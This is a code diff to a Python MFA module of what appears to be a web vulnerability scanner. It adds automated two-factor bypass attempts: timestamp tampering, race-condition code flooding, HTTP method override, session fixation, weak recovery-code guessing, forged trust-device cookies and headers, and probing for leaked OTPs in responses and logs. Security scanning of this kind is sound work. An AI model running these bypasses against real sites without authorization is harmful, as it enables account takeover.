@@ -1,5 +1,7 @@
 import re
 import json
+import time
+import asyncio
 from urllib.parse import urljoin, urlparse
 from modules.base import BaseModule
 from core.utils import random_string
@@ -8,6 +10,7 @@ from core.utils import random_string
 class MfaModule(BaseModule):
     name = "mfa"
     description = "Multi-Factor Authentication Bypass Scanner"
+    exploitable = True
     
     mfa_endpoints = [
         "/2fa", "/2fa/verify", "/mfa", "/mfa/verify", "/auth/2fa", "/auth/mfa",
@@ -24,6 +27,7 @@ class MfaModule(BaseModule):
     
     async def scan(self, target):
         self.findings = []
+        self.bypassed = False
         base_url = self._get_base_url(target)
         
         mfa_urls = await self._discover_mfa_endpoints(base_url)
@@ -34,11 +38,195 @@ class MfaModule(BaseModule):
             await self._test_rate_limiting(mfa_url)
             await self._test_response_manipulation(mfa_url)
             await self._test_backup_codes(mfa_url)
+            await self._test_recovery_code_brute(mfa_url)
+            await self._test_remember_device_bypass(mfa_url)
             await self._test_direct_access(mfa_url, base_url)
+            
+            if self.aggressive:
+                await self._test_time_based_bypass(mfa_url)
+                await self._test_session_fixation(mfa_url, base_url)
+                await self._test_race_condition_bypass(mfa_url)
+                await self._test_method_switching(mfa_url)
+                await self._test_sms_interception(mfa_url, base_url)
         
         await self._test_mfa_setup(base_url)
         
         return self.findings
+    
+    async def _test_time_based_bypass(self, mfa_url):
+        current_time = int(time.time())
+        time_windows = [
+            current_time - 30,
+            current_time - 60,
+            current_time - 90,
+            current_time + 30,
+            current_time + 60,
+        ]
+        
+        for ts in time_windows:
+            resp = await self.http.post(
+                mfa_url,
+                data={"code": "000000", "timestamp": ts},
+                headers={"X-Timestamp": str(ts)}
+            )
+            
+            if self._check_bypass_success(resp):
+                self.add_finding(
+                    "CRITICAL",
+                    "2FA Time-Based Bypass",
+                    url=mfa_url,
+                    evidence=f"Code accepted with manipulated timestamp: {ts}",
+                    confidence_evidence=["time_bypass", "mfa_bypassed"],
+                    request_data={"method": "POST", "url": mfa_url, "timestamp": ts}
+                )
+                self.bypassed = True
+                return
+    
+    async def _test_session_fixation(self, mfa_url, base_url):
+        resp1 = await self.http.get(urljoin(base_url, "/login"))
+        if not resp1.get("status"):
+            return
+        
+        cookies = resp1.get("headers", {}).get("set-cookie", "")
+        session_match = re.search(r'(session[^=]*|PHPSESSID|JSESSIONID)=([^;]+)', cookies, re.I)
+        
+        if session_match:
+            session_name = session_match.group(1)
+            fixed_session = "fixedsession12345"
+            
+            resp = await self.http.post(
+                mfa_url,
+                data={"code": "000000"},
+                headers={"Cookie": f"{session_name}={fixed_session}"}
+            )
+            
+            if resp.get("status") in [200, 302]:
+                new_cookies = resp.get("headers", {}).get("set-cookie", "")
+                if fixed_session in new_cookies or f"{session_name}=" not in new_cookies:
+                    self.add_finding(
+                        "HIGH",
+                        "2FA Session Fixation Possible",
+                        url=mfa_url,
+                        evidence="Session not regenerated after 2FA attempt",
+                        confidence_evidence=["session_fixation", "session_not_rotated"],
+                        request_data={"method": "POST", "url": mfa_url}
+                    )
+    
+    async def _test_race_condition_bypass(self, mfa_url):
+        codes = ["000000", "111111", "222222", "333333", "444444", 
+                 "555555", "666666", "777777", "888888", "999999"]
+        
+        tasks = []
+        for code in codes:
+            tasks.append(self.http.post(mfa_url, data={"code": code}))
+        
+        responses = await asyncio.gather(*tasks, return_exceptions=True)
+        
+        success_count = 0
+        for resp in responses:
+            if isinstance(resp, dict) and self._check_bypass_success(resp):
+                success_count += 1
+        
+        if success_count > 0:
+            self.add_finding(
+                "CRITICAL",
+                "2FA Race Condition Bypass",
+                url=mfa_url,
+                evidence=f"{success_count}/10 concurrent requests succeeded",
+                confidence_evidence=["race_condition", "concurrent_bypass"],
+                request_data={"method": "POST", "url": mfa_url, "concurrent_requests": 10}
+            )
+            self.bypassed = True
+    
+    async def _test_method_switching(self, mfa_url):
+        methods_to_test = [
+            ("PUT", {"code": "000000"}),
+            ("PATCH", {"code": "000000"}),
+            ("DELETE", {}),
+            ("OPTIONS", {}),
+        ]
+        
+        for method, data in methods_to_test:
+            resp = await self.http.request(method, mfa_url, data=data if data else None)
+            
+            if self._check_bypass_success(resp):
+                self.add_finding(
+                    "CRITICAL",
+                    f"2FA Bypass via HTTP Method ({method})",
+                    url=mfa_url,
+                    evidence=f"2FA bypassed using {method} request",
+                    confidence_evidence=["method_bypass", "http_verb_tampering"],
+                    request_data={"method": method, "url": mfa_url}
+                )
+                self.bypassed = True
+                return
+        
+        resp = await self.http.post(
+            mfa_url,
+            data={"code": "000000"},
+            headers={"X-HTTP-Method-Override": "DELETE"}
+        )
+        if self._check_bypass_success(resp):
+            self.add_finding(
+                "CRITICAL",
+                "2FA Bypass via X-HTTP-Method-Override",
+                url=mfa_url,
+                evidence="Method override header accepted",
+                confidence_evidence=["method_override", "mfa_bypassed"]
+            )
+    
+    async def _test_sms_interception(self, mfa_url, base_url):
+        sms_endpoints = [
+            "/api/sms/send",
+            "/api/otp/send",
+            "/2fa/resend",
+            "/mfa/resend",
+            "/verify/resend",
+        ]
+        
+        for endpoint in sms_endpoints:
+            url = urljoin(base_url, endpoint)
+            
+            resp = await self.http.post(url, data={"phone": "+15551234567"})
+            
+            if resp.get("status") == 200:
+                text = resp.get("text", "")
+                
+                code_patterns = [
+                    r'"code"\s*:\s*"?(\d{4,8})"?',
+                    r'"otp"\s*:\s*"?(\d{4,8})"?',
+                    r'"verification_code"\s*:\s*"?(\d{4,8})"?',
+                    r'code=(\d{4,8})',
+                ]
+                
+                for pattern in code_patterns:
+                    match = re.search(pattern, text)
+                    if match:
+                        self.add_finding(
+                            "CRITICAL",
+                            "2FA Code Leaked in API Response",
+                            url=url,
+                            evidence=f"OTP code visible: {match.group(1)[:3]}***",
+                            confidence_evidence=["otp_leaked", "sms_interception"],
+                            request_data={"method": "POST", "url": url}
+                        )
+                        return
+        
+        log_endpoints = ["/logs", "/api/logs", "/debug", "/api/debug"]
+        for endpoint in log_endpoints:
+            url = urljoin(base_url, endpoint)
+            resp = await self.http.get(url)
+            
+            if resp.get("status") == 200:
+                text = resp.get("text", "")
+                if re.search(r'(otp|verification|2fa).*\d{4,8}', text, re.I):
+                    self.add_finding(
+                        "CRITICAL",
+                        "2FA Codes Visible in Debug Logs",
+                        url=url,
+                        evidence="OTP codes found in application logs",
+                        confidence_evidence=["otp_in_logs", "debug_exposure"]
+                    )
     
     def _get_base_url(self, url):
         parsed = urlparse(url)
@@ -214,6 +402,62 @@ class MfaModule(BaseModule):
                     evidence=f"Backup code '{code}' was accepted"
                 )
                 return
+
+    async def _test_recovery_code_brute(self, mfa_url):
+        recovery_codes = ["000000", "111111", "123456", "654321", "999999", "123123", "121212", "000001", "123450"]
+        for code in recovery_codes:
+            resp = await self.http.post(mfa_url, data={"code": code, "type": "recovery"})
+            if self._check_bypass_success(resp):
+                self.add_finding(
+                    "CRITICAL",
+                    "2FA recovery code brute-forced or weak code accepted",
+                    url=mfa_url,
+                    evidence=f"Recovery code '{code}' accepted"
+                )
+                return
+        resp = await self.http.post(mfa_url, data={"code": "000000", "recovery": "true"})
+        if self._check_bypass_success(resp):
+            self.add_finding(
+                "HIGH",
+                "2FA recovery flow accepts weak/default code",
+                url=mfa_url,
+                evidence="recovery=true with 000000 accepted"
+            )
+
+    async def _test_remember_device_bypass(self, mfa_url):
+        resp = await self.http.get(mfa_url)
+        if not resp.get("status"):
+            return
+        cookies = resp.get("headers", {}).get("Set-Cookie", "")
+        remember_headers = {"X-Remember-Device": "true", "X-Trust-Device": "1", "Remember-Device": "1"}
+        for hname, hval in remember_headers.items():
+            r = await self.http.get(mfa_url, headers={hname: hval})
+            if r.get("status") == 200:
+                text = (r.get("text") or "").lower()
+                if "verify" not in text and "code" not in text and ("dashboard" in text or "welcome" in text):
+                    self.add_finding(
+                        "HIGH",
+                        "2FA bypass via remember-device header",
+                        url=mfa_url,
+                        evidence=f"Header {hname}={hval} may skip verification"
+                    )
+                    return
+        bypass_cookies = [
+            ("mfa_trusted", "1"), ("device_trusted", "true"), ("2fa_skip", "1"),
+            ("remember_device", "1"), ("trusted_device", "true"),
+        ]
+        for cname, cval in bypass_cookies:
+            r = await self.http.get(mfa_url, headers={"Cookie": f"{cname}={cval}"})
+            if r.get("status") == 200:
+                text = (r.get("text") or "").lower()
+                if "verify" not in text and "code" not in text and ("dashboard" in text or "welcome" in text):
+                    self.add_finding(
+                        "HIGH",
+                        "2FA bypass via remember-device cookie",
+                        url=mfa_url,
+                        evidence=f"Cookie {cname}={cval} may skip verification"
+                    )
+                    return
     
     async def _test_direct_access(self, mfa_url, base_url):
         protected_pages = [
